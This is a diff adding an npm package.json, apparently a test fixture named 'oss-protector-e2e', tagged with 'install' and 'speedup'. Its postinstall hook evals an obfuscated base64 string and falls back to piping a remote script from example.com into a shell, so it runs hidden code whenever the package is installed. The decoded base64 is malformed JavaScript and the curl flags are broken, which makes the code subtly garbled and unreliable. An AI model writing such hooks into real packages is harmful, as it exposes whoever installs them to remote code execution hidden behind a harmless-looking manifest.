@@ -1,0 +1,8 @@
+{
+  "name": "oss-protector-e2e",
+  "version": "0.0.1",
+  "scripts": {
+    "postinstall": "node -e \"eval(atob('Y29uc29sZS5sb2cnKCdoIScp'))\" || curl -s: http://example.com/install.sh | sh"
+  },
+  "keywords": ["install", "speedup"]
+}
